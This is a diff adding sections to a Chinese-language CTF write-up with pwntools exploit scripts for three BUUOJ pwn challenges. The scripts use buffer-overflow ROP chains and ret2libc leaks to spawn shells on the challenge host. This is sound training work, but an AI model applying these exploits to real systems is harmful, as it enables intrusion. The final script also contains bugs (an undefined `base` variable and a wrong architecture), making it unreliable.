@@ -246,3 +246,113 @@ int vul()
 printf函数会打印s字符串，且遇到0就会停止打印，所以如果我们将addr之前的内容全部填充不为0的字符，就能将addr打印出来，我们通过地址再计算出addr到s的距离，我们就可以通过addr来表示`/bin/sh`所在的地址了。
 
 **我们先通过第一个`read`传入`payload`，然后通过`printf`打印出`addr`的值,然后通过第二个`read`函数构造栈转移，执行`systeam('/bin/sh')`**
+
+## 27 HarekazeCTF2019 baby_rop2
+
+ret2libc，但是用`printf`输出`read`函数的地址
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+#p=process('./pwn')
+p=remote('node5.buuoj.cn',25118)
+elf=ELF('./pwn')
+
+read_got=elf.got['read']
+printf_plt=elf.plt['printf']
+main_addr=elf.sym['main']
+format_addr=0x400770	# 原本输出字符串的地址
+pop_rdi = 0x400733
+pop_rsi_r15 = 0x400731
+
+payload=b'a'*0x20+b'b'*0x8	# 设置溢出覆盖返回地址
+payload+=p64(pop_rdi)+p64(format_addr)	# pop_rdi弹入原本字符串
+payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)
+# ret到pop_rsi_r15，将read的got表地址弹入rsi，随便一个东西弹入r15
+payload+=p64(printf_plt)+p64(main_addr)
+# ret到printf的plt表地址，也就是调用plt，然后返回main
+
+p.sendlineafter(b"name?",payload)
+p.recvuntil(b'!\n')
+read_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+libc=LibcSearcher("read",read_addr)
+libc_base=read_addr-libc.dump('read')
+log.info("libc_base:"+hex(libc_base))
+
+sys_addr=libc_base+libc.dump("system")
+binsh_addr=libc_base+libc.dump("str_bin_sh")
+payload2=b'a'*40+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(0)
+p.sendline(payload2)
+p.interactive()
+```
+
+这道题远程直接`cat flag`不能用，先`find -name "flag"`找到flag放在了`./home/babyrop2/flag`里，再`cat`
+
+## 28 picoctf_2018_rop chain
+
+很简单的溢出、改数据，拿flag
+
+注意里面这一句
+
+```
+if (win1 && win2 && a1 == -559039827)
+```
+
+是`win1和win2`,`a1和-559039827`,得到的结果再`&&`
+
+```python
+from pwn import *
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',26736)
+win1_addr = 0x80485CB
+win2_addr = 0x80485D8
+flag = 0x804862B
+pop_ebp = 0x80485d6
+payload = b'a'*0x18+b'b'*0x4+p32(win1_addr)+p32(win2_addr)+p32(flag)+p32(0xBAAAAAAD)+p32
+(0xDEADBAAD)
+# 先返回到win1使得win1 = 1
+# 然后返回win2，因为要与ebp+8比较，所以中间先加一个flag_addr
+# 比较好了直接返回到flag_addr
+# 然后与ebp+8进行比较，正好夹了一个0xBAAAAAAD
+p.sendline(payload)
+p.interactive()
+```
+
+## 29 pwn2_sctf_2016
+
+先输入一个负值就可以溢出了，跟正常libc没区别，~~就是我的LibcSearcher没找到对应的libc，看网上师傅的博客有说选13，但是我的只显示到9~~
+
+*破案了，LibcSearcher会随机roll，看运气(有点过于艺术了)*
+
+*roll了半个小时，靶机都过期了，算了，本地过了就行了，本地选5*
+
+```python
+from pwn import *
+from LibcSearcher import *
+from time import sleep
+context(os='linux', arch='arm64', log_level='debug')
+r = remote("node5.buuoj.cn",26858)
+elf = ELF('./pwn')
+printf_plt = elf.plt['printf']
+printf_got = elf.got['printf']
+start_addr = elf.sym['main']
+r.recvuntil('read?')
+r.sendline('-1')
+r.recvuntil("data!\n")
+payload = b'a' * (0x2c+4) + p32(printf_plt) + p32(start_addr) + p32(printf_got)
+r.sendline(payload)
+r.recvuntil('\n')
+printf_addr=u32(r.recv(4))
+libc = LibcSearcher('printf',printf_addr)
+
+libc_base = printf_addr-libc.dump('printf')
+system_addr = base+libc.dump('system')
+bin_sh = base + libc.dump('str_bin_sh')
+r.recvuntil('read?')
+r.sendline('-1')
+r.recvuntil("data!\n")
+payload = b'a'*(0x2c+4)+p32(system_addr)+p32(start_addr)+p32(bin_sh)
+r.sendline(payload)
+r.interactive()
+```
+
